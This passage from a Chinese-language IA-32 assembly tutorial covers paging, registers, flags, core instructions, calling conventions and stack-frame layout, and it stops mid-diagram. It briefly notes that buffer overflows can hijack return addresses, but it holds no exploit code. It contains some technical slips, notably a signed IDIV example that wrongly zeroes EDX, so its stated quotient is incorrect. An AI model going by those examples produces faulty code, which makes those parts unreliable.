但是现代操作系统一般都启用了分页，CPU的内存管理单元 (MMU) 会进行下一步转换\nMMU将32位的线性地址拆分为三部分：页目录索引 (10位) + 页表索引 (10位) + 页内偏移 (12位)\n页目录表：有1024个表项，每项4B，共4KB，每项指向一个页表 页表：也有1024个表项，每项4B，共4KB，每项指向一个物理页框 页框：大小固定为4KB 先查页目录，再查页表，最终找到数据所在的物理内存页，加上页内偏移，就得到了最终的物理地址\n物理地址 = 物理页框基址 + 页内偏移 示例 我们现在运行在一个 32位保护模式的系统中，分页功能已经开启，程序中有这样一条指令：\nmov eax, [0x1234] 这条指令的意思是把内存中地址DS:0x1234处的数据读到EAX寄存器中，也就是说，这里访问的逻辑地址是：\n逻辑地址 = DS : 0x1234 假设段寄存器DS的内容是0x0008，二进制表示：\n0000 0000 0000 1000b 字段 位 值 含义 Index 15:3 1 第1个描述符 TI 2 0 从GDT中查 RPL 1–0 0 当前访问特权级 0 假设GDT[1]这个描述符里存的段信息是：\n字段 值 段基址 0x00400000 段界限 0x000FFFFF 访问属性 可读可写数据段 于是：\n段基址 = 0x00400000 线性地址 = 段基址 + 偏移量 = 0x00400000 + 0x00001234 = 0x00401234 现在系统开启了分页，假设页目录基址寄存器CR3的值是0x00100000，即页目录表在物理内存0x00100000处\n把线性地址0x00401234拆成三段，二进制表示：\n0000 0000 0100 0000 0001 0010 0011 0100 部分 位数 值（二进制） 十进制 页目录索引 10 位 0000000001 1 页表索引 10 位 0000000010 2 页内偏移 12 位 001101000100 0x234 页目录表起始于0x00100000，每个表项占4字节，页目录索引是1，所以要读的表项地址：\n0x00100000 + 1 * 4 = 0x00100004 假设这个页目录项内容是0x00200003\n高20位：页表的物理基址，是0x00200000 低12位：标志位（Present=1, RW=1, US=0） 页表基址0x00200000，页表索引是2，所以要读的表项地址：\n0x00200000 + 2 * 4 = 0x00200008 假设这个页表项内容是0x00A00003\n高20位：物理页框基址，是0x00A00000 最终得到物理地址：\n物理地址 = 页框基址 + 页内偏移 = 0x00A00000 + 0x00000234 = 0x00A00234 IA-32核心寄存器 通用寄存器 (GPR) IA-32架构有8个32位通用寄存器\n32位 16位 8位高/低 主要功能 EAX AX AH / AL 累加器（Accumulator）\n用于算术运算和函数返回值 EBX BX BH / BL 基址寄存器（Base）\n用于在内存中寻址 ECX CX CH / CL 计数器（Counter）\n用于循环和字符串操作的计数，是无符号计数器 EDX DX DH / DL 数据寄存器（Data）\n配合EAX进行乘除法运算或存放I/O指针 ESI SI - 源变址寄存器（Source Index）\n字符串和内存操作的源地址 EDI DI - 目的变址寄存器（Destination Index）\n字符串和内存操作的目的地址 ESP SP - 栈指针（Stack Pointer)\n永远指向当前栈的栈顶 EBP BP - 基址指针（Base Pointer）\n用作当前函数栈帧的基址，用于访问局部变量和参数 程序状态与控制寄存器 (EFLAGS) EFLAGS寄存器是一个32位的寄存器\n它的每一位（标志位）都记录了程序运行中的特定状态，主要用于条件判断和流程控制\n下面是一些常用的标志位：\n标志位 名称 描述和功能 ZF 零标志\n(Zero Flag) 若算术运算结果为0，则ZF置为1，否则为0，常用于判断相等 OF 溢出标志\n(Overflow Flag) 当有符号整数运算的结果超出寄存器能表示的范围时，OF置为1 CF 进位标志\n(Carry Flag) 当无符号整数运算的结果溢出（产生进位或借位）时，CF置为1 SF 符号标志\n(Sign Flag) 等于运算结果的最高位（也就是符号位）\n对于有符号数，0表示正数，1表示负数 DF 方向标志\n(Direction Flag) 控制字符串操作指令（如MOVS, SCAS）的处理方向\n若DF=0，变址寄存器（ESI, EDI）地址递增\n若DF=1，则地址递减 TF 陷阱标志\n(Trap Flag) 若置为1，CPU在执行每条指令后会产生一个单步中断 IF 中断允许标志\n(Interrupt Enable Flag) 若置为1，CPU可以响应外部设备的中断请求 指令指针寄存器 (EIP) EIP（Extended Instruction Pointer）是一个32位的寄存器，存放着下一条将要被CPU执行的指令的地址\nCPU总是根据CS段寄存器和EIP寄存器中的地址来读取下一条指令，每当一条指令被读取后，EIP的值会自动增加，增加的大小等于刚刚被读取指令的字节数，从而指向紧随其后的下一条指令\nEIP寄存器的值不能被直接修改，它的改变只能通过特定的控制流指令（如 JMP, CALL, RET）或者由中断、异常来完成\n段寄存器 段寄存器是6个16位的寄存器，在保护模式的内存分段管理中，它们存放着指向各个内存段的“段选择器”，CPU通过这些段选择器在系统描述符表（GDT/LDT）中找到段的实际基地址。\n寄存器 名称 主要功能 CS 代码段寄存器\n(Code Segment) 存放应用程序代码所在段的段选择器 SS 栈段寄存器\n(Stack Segment) 存放当前程序栈所在段的段选择器 DS 数据段寄存器\n(Data Segment) 存放程序主要数据所在段的段选择器 ES/FS/GS 附加数据段寄存器\n(Extra Segment) 存放程序使用的附加数据段的段选择器\n可用于特殊目的，比如通过FS定位线程环境块（TEB）等 IA-32数据类型 基本数据类型 这些是构成更复杂数据结构的基础整数类型\nByte\n1字节（8位）的数据\nWord\n2字节（16位）的数据\nDoubleword\n4字节（32位）的数据\n这是IA-32架构中最常用的数据大小，与通用寄存器（如EAX）的大小一致\nQuadword\n8字节（64位）的数据\n虽然IA-32没有64位的通用寄存器，但在某些特定指令（如RDTSC）或通过组合EDX和EAX寄存器，可以处理64位数据\nDouble Quadword\n16字节（128位）的数据\n浮点数据类型 半精度（Half Precision）：16位浮点数 单精度（Single Precision）：32位浮点数 双精度（Double Precision）：64位浮点数 扩展双精度（Double Extended Precision）：80位浮点数 指针类型 指针在IA-32中用于存储内存地址，主要分为两种\nNear Pointer（近指针）\n这是一个32位的偏移量\n它指向当前段内的某个地址，在现代操作系统的平面内存模型下，这实际上就是程序的虚拟地址\nFar Pointer（远指针）\n这是一个48位的指针，由一个16位的段选择器和一个32位的偏移量组成\n它用于在分段内存模型下，跨段访问数据\nIA-32汇编指令 Intel与AT\u0026amp;T汇编语法 Intel语法 这是Windows环境下的主流语法，易于阅读\n[指令] [目标操作数], [源操作数] 逗号后面空格不是语法必须的，但是加空格是一个非常推荐的习惯，大多数逆向软件也遵从这个习惯\n本文档后续将统一使用Intel语法\nAT\u0026amp;T语法 常用于Linux和GNU工具链\n[指令] [源操作数], [目标操作数] 示例 将立即数4移动到EAX寄存器\n语法 指令 Intel mov eax, 4 AT\u0026amp;T mov $4, %eax 数据移动指令 这类指令用于在寄存器、内存和立即数之间传递数据\nMOV：数据传送 MOV(move)是数据传送指令，将右边操作数的值复制到左边操作数中\n但是这两个操作数中最多只能有一个是内存操作数（带方括号的那种），另一个必须是寄存器或立即数\n立即数 -\u0026gt; 寄存器 将常量0x12345678放入ESI\nMOV ESI, 0x12345678 寄存器 -\u0026gt; 寄存器 将ECX的内容复制到EAX\nMOV EAX, ECX 立即数 -\u0026gt; 内存 将地址为EAX的4字节内存设为1\nMOV DWORD PTR [EAX], 1 [EAX]表示取EAX寄存器中的值作为内存地址\nDWORD PTR表示操作的内存数据大小是4字节（32 位）\n当汇编器不清楚要操作内存的大小时，就需要使用修饰符来确定，以下是常用的修饰符：\n修饰符 大小 说明 BYTE PTR 1 字节（8 位） 访问 8 位数据 WORD PTR 2 字节（16 位） 访问 16 位数据 DWORD PTR 4 字节（32 位） 访问 32 位数据 QWORD PTR 8 字节（64 位） 访问 64 位数据 NEAR PTR 2/4 字节偏移 近指针，只包含偏移，段寄存器不变，常用于近调用 FAR PTR 段 + 偏移 远指针，包含段选择符和偏移，常用于跨段调用 寄存器 -\u0026gt; 内存 将EBX的值写入地址为EAX的内存中\nMOV [EAX], EBX 将EAX的值写入地址为ESI+0x34的内存中\nMOV [ESI+34H], EAX 注意这里的[]不能拆开写！\n内存 -\u0026gt; 寄存器 将地址为ECX的内存中的值读入EAX\nMOV EAX, [ECX] 将地址为ECX+EAX的内存中的值读入EDX\nMOV EDX, [ECX+EAX] 将内存中地址0x50处的数据读入寄存器EAX\nMOV EAX, [0x50] LEA：加载有效地址 LEA (Load Effective Address) 用于计算源操作数指定的内存地址，并将地址加载到目标寄存器中\n它与MOV的关键区别在于，MOV会访问该地址并取出其中的数据，而LEA只计算地址，不访问内存\n也正因如此，使用LEA计算时，寄存器必须加上[]表示取地址\n计算内存地址 假设EAX = 0x1000, 内存地址0x1000处的值为0xABCD\n使用MOV：\nMOV EBX, [EAX] MOV将地址EAX（0x1000）指向的数据0xABCD放入EBX，结果是EBX = 0xABCD\n使用LEA：\nLEA EBX, [EAX] LEA将地址表达式[EAX]本身的值0x1000放入EBX，结果是EBX = 0x1000\n执行快速数学运算 LEA可以执行一些基础的数学运算，且比使用ADD或MUL等指令更高效，因为它不影响CPU的标志位\n计算EAX = EBX + ECX * 4 + 100H：\nLEA EAX, [EBX + ECX*4 + 100H] 注意这里的[]不能拆开写！\n串操作 这类指令专门用于高效处理内存中的连续数据块（字符串）\n它们通常与 REP 系列前缀结合使用，以重复执行相同的操作，重复次数由 ECX 寄存器控制\nREP系列前缀 REP\n全称REPeat，在执行指令前会检查ECX，指令会重复执行ECX次\neg：\nMOV ECX, 5 ; 重复次数 REP MOVSB ; 将[ESI]的字节移动到[EDI]，重复5次 REPE / REPZ\n全称REPeat While Equal / REPeat While Zero，当ZF=1且ECX不为0时继续重复\neg：\nMOV ECX, 10 REP CMPSB ; 比较两个字符串，ZF=1时继续，最多10次 REPNE / REPNZ\n全称REPeat while Not Equal / REPeat while Not Zero，当ZF=0且ECX不为0时继续重复\neg：\nMOV ECX, 10 REPNE SCASB ; 扫描字符串，ZF=0时继续，最多10次 索引增减控制指令CLD/STD EFLAGS寄存器中的DF标志位决定了每次操作后ESI和EDI的变化方向，而CLD和SLD指令控制着DF\nCLD指令\n全称Clear Direction Flag，DF = 0，ESI和EDI在每次操作后递增\nSTD指令\n全称Set Direction Flag，DF = 1，ESI和EDI在每次操作后递减\n取地址运算符OFFSET OFFSET是汇编语言中的一个编译时运算符，作用是取得一个标号（变量、数组等）的内存地址（偏移量）\n比如我在数据段（.data）定义一个变量：\n.data SourceAddress DB \u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;, 0 假设编译器把这段数据放在内存地址0x00405000\n那么OFFSET SourceAddress在汇编时就会被计算为0x00405000\n💡 Tip 这里的DB被称作伪指令\n它不是CPU执行的指令，是给汇编器用的命令，告诉汇编器在程序中生成数据、定义常量或分配空间\n类似伪指令还有：\n指令 全称 定义单位 示例 DB Define Byte 1 字节 DB 1, 2, 3 DW Define Word 2 字节 DW 1234h DD Define Doubleword 4 字节 DD 0x12345678 DQ Define Quadword 8 字节 DQ 0x1122334455667788 MOVSB / MOVSW / MOVSD：移动字符串 MOVS（Move String）指令用于将数据从源地址DS:ESI复制到目标地址ES:EDI\n根据指令后缀，它每次可以复制1、2或4个字节\nMOVSB：移动1字节（Byte） MOVSW：移动2字节（Word） MOVSD：移动4字节（Double Word） 下面的代码是使用REP MOVSD将源地址的32字节数据复制到目标地址：\n;设置参数 MOV ESI, OFFSET SourceAddress ; 将源地址加载到ESI MOV EDI, OFFSET DestAddress ; 将目标地址加载到EDI MOV ECX, 8 ; 设置重复次数 (8次*4字节/次=32字节) ;执行复制 CLD ; 清除方向标志位（DF=0），确保ESI和EDI递增 REP MOVSD ; 重复执行MOVSD指令ECX次，即8次 STOSB / STOSW / STOSD：存储字符串 STOS（Store String）指令用于将AL/AX/EAX寄存器中的值存储到ES:EDI指向的内存地址\n它常用于初始化一块内存区域\nSTOSB：将AL的内容存入[EDI] STOSW：将AX的内容存入[EDI] STOSD：将EAX的内容存入[EDI] 以下代码演示了如何将EDI指向的 36 字节内存块全部设置为 0\n;设置参数 MOV EDI, ESI ; 设置目标内存地址 (假设地址已在ESI中) XOR EAX, EAX ; 将EAX清零，这是我们要写入的值 MOV ECX, 9 ; 设置重复次数 (9次*4字节/次=36字节) ;执行写入 CLD ; 确保EDI递增 REP STOSD ; 重复执行STOSD指令ECX次，将EAX(0)连续写入目标内存 📝 Note XOR EAX, EAX效果和MOV EAX, 0一样，都是将寄存器值置零，但是会更加高效\n这是因为CPU看到XOR reg, reg这种特殊模式，会自动识别为清零优化，不会依赖旧值\nIntel官方优化手册明确指出：\n“Zero idioms such asXOR reg, regorSUB reg, regare recognized by the processor and are handled specially — they do not create a dependency on the old register value.”\nSCASB / SCASW / SCASD：扫描字符串 SCAS（Scan String）指令用于将AL/AX/EAX寄存器中的值与ES:EDI指向的内存值进行比较，并根据比较结果设置EFLAGS寄存器的标志位\n寄存器值等于内存值：ZF = 1 寄存器值不等于内存值：ZF = 0 它常用于在字符串中搜索特定字符\nSCASB：比较AL和[EDI] SCASW：比较AX和[EDI] SCASD：比较EAX和[EDI] 下面的代码展示了如何计算一个以\\0（NULL）结尾的字符串的长度\n;设置参数 MOV EDI, EBX ; 假设字符串的起始地址在EBX中，将其加载到EDI XOR AL, AL ; 将AL设置为0，即我們要查找的字符串结束符\u0026#39;\\0\u0026#39; MOV ECX, -1 ; 将ECX设为最大值，以扫描任意长度的字符串 ;执行扫描 CLD ; 确保EDI递增 REPNE SCASB ; 当AL!=[EDI]时重复扫描，每次扫描EDI都会递增，直到找到\u0026#39;\\0\u0026#39;或扫描完ECX次 ; 找到\u0026#39;\\0\u0026#39;后，EDI指向\u0026#39;\\0\u0026#39;字符的下一个字节 ;计算长度 NOT ECX ; 对ECX按位取反，得到扫描过的字符数 DEC ECX ; 让ECX减一，即减去最后的\u0026#39;\\0\u0026#39;字符，得到字符串的实际长度 ; 最终长度存储在ECX中 📝 Note MOV ECX, -1这一步是为了什么？\n在底层机器码中，-1并不会以负号形式存储，而是使用补码表示，而32位补码中-1 = 0xFFFFFFFF\n所以这条指令本质上等价于：\nMOV ECX, 0xFFFFFFFF 这样就把ECX设为了最大值0xFFFFFFFF，而ECX是无符号计数器，递减就从这个极大数开始，而不是-1\nSCASB每执行一次，会自动让ECX减1，我们不知道字符串长度是多少，所以干脆从最大值开始扫\n看看类似的用法：\n汇编写法 实际数值 寄存器值 MOV ECX, 0 0 0x00000000 MOV ECX, 1 1 0x00000001 MOV ECX, -1 -1 0xFFFFFFFF MOV ECX, -2 -2 0xFFFFFFFE 算术与位运算指令 这类指令用于执行基本的数学计算和位级操作\nADD / SUB：加法 / 减法 执行加法或减法运算，并将结果存回目标操作数\nADD dest, src ; 结果是dest = dest + src SUB dest, src ; 结果是dest = dest - src INC / DEC：加一 / 减一 将操作数的值增加1或减少1，比等效的 ADD/SUB 指令更短、更快\nINC ECX ; 结果是ECX = ECX + 1 DEC EAX ; 结果是EAX = EAX - 1 NEG：取补 通过执行按位取反后加一的操作来获得操作数的算术相反数（补码）\nNEG EBX ; 结果是EBX = -EBX IMUL / MUL：有符号 / 无符号乘法 执行乘法运算，根据操作数的数量，用法有所不同\n指令 操作数形式 结果寄存器 是否占用EDX 特点 MUL SRC 单操作数 EDX:EAX 是 完整64位结果，无符号 IMUL SRC 单操作数 EDX:EAX 是 完整64位结果，有符号 IMUL DEC, SRC 双操作数 ECX 否 只保留低32位，有符号 IMUL DEC, SRC, 立即数 三操作数 ECX 否 可立即数乘，有符号 单操作数（IMUL和MUL都支持） 将EAX与指定操作数相乘，结果是一个64位数，高32位存入EDX，低32位存入EAX\nMOV EAX, -2 ; EAX = 0xFFFFFFFE MOV EBX, 3 IMUL EBX ; EAX * EBX = -6 -\u0026gt; EDX:EAX = 0xFFFFFFFF:0xFFFFFFFA MUL EBX ; EAX * EBX = 4294967290 -\u0026gt; EDX:EAX = 0x00000002:0xFFFFFFFA 多操作数（只有IMUL支持） 提供更高的灵活性，，可指定目标寄存器，结果直接存入目标寄存器，不分高低位，不占用EDX\nMOV EBX, 3 IMUL EAX, EBX ; EAX = EAX * EBX IMUL ECX, EBX, 5 ; ECX = EBX * 5 = 20 ; 也可以直接指定内存，假设 [0x123] = -3 IMUL ECX, [0x123], 5 ; ECX = -3 * 5 = -15 IDIV / DIV：有符号 / 无符号除法 执行除法运算\n位宽 被除数寄存器 商寄存器 余数寄存器 8位 AX AL AH 16位 DX:AX AX DX 32位 EDX:EAX EAX EDX 无符号的DIV MOV EAX, 20 ; 低 32 位被除数 MOV EDX, 0 ; 高 32 位被除数 MOV EBX, 6 ; 除数 DIV EBX ; EAX = 20 / 6 = 3 (商) ; EDX = 20 % 6 = 2 (余数) 有符号的IDIV MOV EAX, -20 MOV EDX, 0 MOV EBX, 6 ; 除数 IDIV EBX ; EAX = -20 / 6 = -3 (商) ; EDX = -20 % 6 = -2 (余数) AND / OR / XOR：按位与 / 或 / 异或 对操作数进行按位逻辑运算，结果存回第一个操作数\n指令 运算类型 说明 AND 按位与 两位都为1时结果为1，否则为0 OR 按位或 两位有1时结果为1，否则为0 XOR 按位异或 两位不同时结果为1，相同为0 AND EAX, 0x0F ; 取低4位，清除高28位 OR EAX, EBX ; 将EBX中为1的位合并到EAX XOR EAX, 0xFFFFFFFF ; 按位取反 之前提到过的XOR EAX, EAX是将EAX寄存器清零的最快方式，CPU能识别这种特殊形式并进行优化，不产生对旧值的依赖，因此比MOV EAX, 0更高效\nNOT：按位取反 将操作数的每一位反转（0变1，1变0）\nMOV EAX, 0x0F ; 二进制0000 0000 0000 1111 NOT EAX ; 变成1111 1111 1111 0000 = 0xFFFFFFF0 SHL / SAL / SHR / SAR：逻辑 / 算数 的 左移 / 右移 将操作数的位向左或向右移动，空出的位用0填充\n指令 运算 填充位 运算结果 SHL / SAL 左移 低位补 0 左移N位=乘以$2^N$ SHR 逻辑右移 高位补 0 右移N位=无符号除以$2^N$ SAR 算术右移 高位补符号位 右移N位=有符号除以$2^N$（保留符号） MOV EAX, 3 SHL EAX, 2 ; EAX = 3 \u0026lt;\u0026lt; 2 = 12 (3*2^2) SAL EAX, 2 ; 和SHL完全一样 MOV EBX, 16 ; 0x00000010 SHR EBX, 2 ; EBX = 16 \u0026gt;\u0026gt; 2 = 4 (无符号除以 4) MOV ECX, -16 ; 0xFFFFFFF0 SAR ECX, 2 ; ECX = -16 \u0026gt;\u0026gt; 2 = -4 (保留符号) ROL / ROR：循环左移 / 右移 将操作数的位向左或向右移动，移出的位会从另一端循环回来填充空位\nMOV AL, 10010011b ; 二进制数 10010011，AL = 0x93 ROL AL, 2 ; AL = 01001110b, 原高2位“10”循环到低位 ROR AL, 3 ; AL = 11001001b, 低3位“110”循环到高位 控制流指令 这类指令通过修改EIP（指令指针）寄存器的值来改变程序的执行流程，从而实现分支、循环等结构\n比较指令 这两个指令通过执行内部运算来改变EFLAGS寄存器中的状态标志位，但不会修改操作数本身\n它们为后续的条件跳转指令提供判断依据\nCMP：减法比较 内部执行A - B的减法运算\nMOV EAX, 5 CMP EAX, 3 ; 实际执行 5 - 3 JG greater ; 如果 EAX \u0026gt; 3, 跳转 TEST：AND比较 内部执行A AND B的按位与运算\neg1：检测寄存器是否为0\nTEST EAX, EAX ; A AND A JZ is_zero ; 如果结果为 0 (ZF=1)，跳转 eg2：检测某一位是否为1\nTEST AL, 1 ; 检查最低位是否为 1 JNZ odd_number ; 若最低位为1（奇数），跳转 JMP：无条件跳转 JMP（Jump）指令会立即无条件地将程序的执行点转移到指定的目标地址\n基本语法：\nJMP label label可以是同一段代码内的标签（短跳转或近跳转），也可以是其他段的地址（远跳转）\nMOV EAX, 0 ; EAX = 0 JMP skip ; 无条件跳转到 skip 标签 MOV EAX, 5 ; 这一行永远不会被执行！ skip: MOV EAX, 1 ; 执行到这里 Jcc：条件跳转 Jcc (Jump on Condition) 是一系列指令的统称\n它们在CMP或TEST指令之后，根据EFLAGS寄存器的状态来决定是否进行跳转\n指令 跳转条件（基于 EFLAGS） 含义（中文描述） 比较类型 JE / JZ ZF = 1 相等 / 结果为零 通用 JNE / JNZ ZF = 0 不相等 / 结果非零 通用 JG / JNLE ZF = 0 AND SF = OF 大于（有符号数） 有符号 JGE / JNL SF = OF 大于等于（有符号数） 有符号 JL / JNGE SF ≠ OF 小于（有符号数） 有符号 JLE / JNG ZF = 1 OR SF ≠ OF 小于等于（有符号数） 有符号 JA / JNBE CF = 0 AND ZF = 0 大于（无符号数） 无符号 JAE / JNB CF = 0 大于等于（无符号数） 无符号 JB / JNAE CF = 1 小于（无符号数） 无符号 JBE / JNA CF = 1 OR ZF = 1 小于等于（无符号数） 无符号 JS SF = 1 结果为负 通用 JNS SF = 0 结果为正或零 通用 JO OF = 1 溢出发生 通用 JNO OF = 0 无溢出 通用 JC CF = 1 进位（或借位）发生 通用 JNC CF = 0 无进位 / 无借位 通用 JP / JPE PF = 1 奇偶标志为偶（结果1个数为偶数） 通用 JNP / JPO PF = 0 奇偶标志为奇 通用 跳转指令前缀 跳转指令前缀是汇编器用来指示跳转类型或范围的关键字\n它不改变跳转的条件本身，只影响指令编码和偏移量大小，也就是CPU计算跳转地址时用多少字节表示偏移\n这本质上是告诉CPU跳转目标离它有多远，CPU会选择合适的指令长度（1-6字节）存储偏移\n前缀 偏移量大小 说明 SHORT 8位有符号偏移量 (-128 ~ +127) 近距离跳转，小范围循环或if/else NEAR 16位或32位偏移量（同段跳转） 目标在当前代码段内，距离较远 FAR 16/32位段内偏移 + 16位段选择子 跨段跳转，改变CS寄存器 条件跳转（Jcc）默认使用SHORT，如果目标太远，汇编器会自动转换为NEAR\n流程控制结构示例 if-else结构 C语言：\nif (*esi != 0) { // block A } // block B 汇编：\nMOV EDX, [ESI] ; EDX = *esi TEST EDX, EDX ; 比较 EDX 和 0 JZ SHORT block_B ; 如果 EDX 为 0, 则跳转到 block_B ;block A 的代码 ... block_B: ;block B 的代码 for循环结构 C语言：\nfor (int i=0; i\u0026lt;10; i++) { printf(\u0026#34;%d\\n\u0026#34;, i); } 汇编：\nXOR ESI, ESI ; ESI = 0 (作为计数器 i) LOOP_START: ;调用 printf 的代码 PUSH ESI PUSH OFFSET FORMAT_STRING CALL printf ADD ESP, 8 ; 平衡堆栈 INC ESI ; i++ CMP ESI, 10 ; 比较 i 和 10 JL SHORT LOOP_START ; 如果 i \u0026lt; 10, 继续循环 栈与函数调用指令 栈 在IA-32架构下，栈是连续的内存区域，用于存储临时数据、函数参数和返回地址\n栈存在于一个栈段内，由段寄存器SS指向段描述符\nESP寄存器所包含的栈指针永远指向栈顶位置，所有针对栈的操作都是基于SS:ESP的地址引用\nIA-32 的栈通常是高地址向低地址生长\n栈帧 什么是栈帧 每当一个函数被调用时，都会在栈上为其分配一块专属空间，称为该函数的栈帧\n栈帧用于存放函数的局部变量、传递给其他函数的参数以及保存调用者的上下文信息\n栈帧的组成内容如下：\n内容 说明 局部变量 函数内部声明的变量，存放在栈帧中 参数 调用被调用函数时压入栈的参数 栈帧相关指针 用于管理函数返回与栈帧切换 返回指令指针 CALL指令将EIP（下一条指令地址）压栈，函数返回后跳转到这里执行 栈帧基指针（EBP） EBP在函数调用时用作栈帧的固定参考点，方便访问局部变量和函数参数\n基本栈操作：PUSH / POP PUSH：压栈 将一个寄存器、内存或立即数的值压入栈顶\n先将栈顶指针ESP减去一个单位，然后将操作数存入ESP指向的新地址：\n栈向低地址扩展，IA-32下，一个单位4字节（32bit）：ESP = ESP - 4\n将数据写入栈顶：[ESP] = 操作数\nMOV EAX, 0x1234 PUSH EAX ; ESP -= 4 , [ESP] = 0x1234 PUSH先减再存值\nPOP：出栈 从栈顶取出数据到寄存器或内存，并恢复栈指针\n先将ESP指向地址的值取出到目标操作数，然后将ESP增加一个单位：\n取出[ESP]的值到目标操作数 栈指针上移，恢复原位置：ESP = ESP + 4 POP EBX ; EBX = 栈顶值 , ESP += 4 POP先取值再加\n调用与返回的分类 根据目标函数与调用者是否在同一个代码段，调用和返回可以分为两类\n近调用 (Near Call) / 近返回 (Near Return) 控制流转移到当前代码段中的函数，或从当前代码段的函数返回\n这是最常见的调用方式，用于访问程序内部的本地函数\n远调用 (Far Call) / 远返回 (Far Return) 控制流转移到其他代码段中的函数，或从其他代码段返回\n这种方式通常用于访问操作系统提供的服务（API）或其他进程的函数\nCALL：调用函数 跳转到被调用函数，并保存返回地址以便函数执行完毕后回到调用点\n近调用 压栈返回地址：CALL指令会将下一条指令的地址（EIP） 压入栈顶 跳转到函数入口：CPU将EIP设置为被调用函数的起始地址 ; 假设当前 EIP = 0x00401000 CALL my_function ; 1. 保存返回地址：PUSH 0x00401005 (CALL指令长度为5字节) ; 2. 跳转到my_function：JMP my_function 远调用 对于远调用，由于跨越了代码段，CPU不仅需要保存返回的地址偏移（EIP），还必须保存返回的段（CS），以便能够正确返回到调用者所在的原始代码段\n压栈段寄存器CS：将当前代码段寄存器CS的值压入栈顶 压栈返回地址EIP：将EIP的当前值压入栈顶 跳转到函数入口：将目标函数的段选择器和偏移地址分别载入CS和EIP寄存器 CALL FAR PTR 2000h:0100h ; 远调用到 2000:0100 这里必须使用FAR PTR表示是远调用，否则会被当成近调用处理\nRET：从函数返回 从栈顶取出返回地址，恢复执行流到调用者\n近返回（RET/RETN） 弹出返回地址：从栈顶弹出一个32位的值到EIP寄存器 清理参数 (可选)：RET n会在弹出返回地址后，额外将ESP增加n字节，用于清理调用者压入栈的参数 RET ; 标准返回 RETN ; 近返回 RET 8 ; 返回并清理栈上 8 字节参数 此时就可以把RET理解为：\nPOP EIP 远返回（RETF） 弹出返回地址EIP：从栈顶弹出一个32位的值到EIP寄存器 弹出段寄存器CS：从栈顶弹出一个16位的值到CS寄存器 RETF ; 远返回 CPU不跟踪返回指令指针在栈上的位置，程序员必须确保在执行RET指令时，栈顶内容恰好是正确的返回地址\n如果栈上的返回地址在RET执行前被修改（例如通过缓冲区溢出），程序的执行流就可能被劫持，这是一个常见的安全漏洞\n调用约定 这是函数调用双方必须遵守的一套规则，它规定了参数如何传递、返回值如何返回、以及哪一方（调用者或被调用者）负责清理栈上的参数。\ncdecl\nC语言的默认约定，参数从右到左压栈，调用者负责清理栈\nstdcall\nWin32API常用，参数从右到左压栈，被调用者负责清理栈（通过 RET n）\nfastcall\nstdcall的变种，前两个（或更多）参数通过ECX和EDX等寄存器传递，以提高速度，剩余参数压栈，被调用者负责清理\n栈帧的创建与销毁（函数指令框架） 函数序言 (Prologue) 当执行CALL语句之后，函数开始时建立自己的栈帧\nPUSH EBP ; 保存调用者的栈帧基址 (旧EBP) MOV EBP, ESP ; 将当前栈顶设为新的栈帧基址 SUB ESP, 20H ; 让栈顶向低地址处延伸，以此为局部变量分配32字节空间 局部变量会放在EBP下面（地址更小），参数会放在EBP上面（地址更大），也就是这样访问：\n[EBP + 8] ; 第一个参数（返回地址占用了4字节，所以从第8字节开始） [EBP + 12] ; 第二个参数 [EBP - 4] ; 第一个局部变量 [EBP - 8] ; 第二个局部变量 函数结尾 (Epilogue) 函数返回前恢复调用者栈帧的标准操作\nMOV ESP, EBP ; 释放局部变量空间 POP EBP ; 恢复调用者的栈帧基址 RET ; 返回 ENTER / LEAVE 高级指令，用于简化栈帧的创建和销毁\nENTER等价于函数序言，LEAVE等价于MOV ESP, EBP; POP EBP\n也就是说，一个函数应该（不是必须）写在这样的框架里：\nPUSH EBP MOV EBP, ESP ;（函数主体，局部变量/操作） MOV ESP, EBP POP EBP RET 或者：\nENTER ;（函数主体，局部变量/操作） LEAVE RET 调用流程总结 结合之前所说的一切，我们就总结出来一个函数被调用时触发的操作顺序：\n调用者准备调用 （压入参数） 执行CALL指令 （压入返回地址） 函数序言 （压入调用者的EBP，为局部变量开辟空间） 函数主体 （压入局部变量） 那么当一个栈帧创建完毕，应该是这样的：\n高地址 │ 参数 ← 函数调用者压入 │ 返回地址 ← call 自动压入 │ 旧 EBP（上一个EBP） ← push ebp 保存调用者基址 │ 局部变量 低地址 而在PUSH EBP之后，当前栈顶变成了栈帧的基址，也就是说帧创建完毕后，EBP和ESP位置如下：\n高地址 │ 参数 │ 返回地址 │ 旧 EBP（上一个EBP） [EBP位置] │ 局部变量 [ESP位置] 低地址 此时[EBP]存放着调用者的EBP，[ESP]存放着最后一个局部变量（如果申请的空间用满了的话）\n下面的图就很好展示了调用函数栈帧变化：\n调用流程示例 举个例子，假设有这样一个程序：\nmain: call foo ret foo: push ebp mov ebp, esp sub esp, 4 mov DWORD PTR [ebp-4], 1 ;局部变量 push 1 ;传入bar的参数 call bar mov esp, ebp pop ebp ret bar: push ebp mov ebp, esp sub esp, 4 mov esp, ebp pop ebp ret 进入main EBP：main的旧EBP\nESP：main栈顶（局部变量区底）\n高地址 ┌───────────────────────┐ │ main 的参数（也许有也许没有）\t│ ├───────────────────────┤ │ main 的返回地址 │ ← 调用者是CRT（C运行时） ├───────────────────────┤ │ 调用 main 的栈帧的EBP │ ← EBP 指向这里 ├───────────────────────┤ │ main 的局部变量 │ └───────────────────────┘ 低地址 call foo main函数先把foo需要的参数压栈，之后call foo\ncall foo做了两件事：\n1.把call下一条指令的地址，即当前EIP（指向call指令）+call指令长度，也即foo的返回地址，压入栈\n2.让EIP跳转到foo的开始地址\n高地址 ┌───────────────────────┐ │ main 的参数 │ ├───────────────────────┤ │ main 的返回地址 │ ├───────────────────────┤ │ 调用 main 的栈帧的EBP │ ├───────────────────────┤ │ main 的局部变量 │ ├───────────────────────┤ │ → foo 的参数 │ ├───────────────────────┤ │ → foo 的返回地址 (ret to main) │ ← ESP └───────────────────────┘ 低地址 进入foo 进入foo后，执行序言，为foo创建帧：\npush ebp ; 保存 main 的 EBP mov ebp, esp ; 建立 foo 的基址 sub esp, 4 ; 为 foo 的局部变量分配空间 EBP：当前栈帧的固定基址\n[EBP]：main的旧EBP\n[EBP+4]：返回地址（返回 main）\n[EBP-4]、[EBP-8]：foo的局部变量\n高地址 ┌─────────────────────────────┐ │ main 的参数 │ ├─────────────────────────────┤ │ main 的返回地址 │ ├─────────────────────────────┤ │ 调用 main 的栈帧的EBP │ ├─────────────────────────────┤ │ main 的局部变量 │ ├─────────────────────────────┤ │ foo 的参数 │ ├─────────────────────────────┤ │ foo 的返回地址 (ret to main) │ 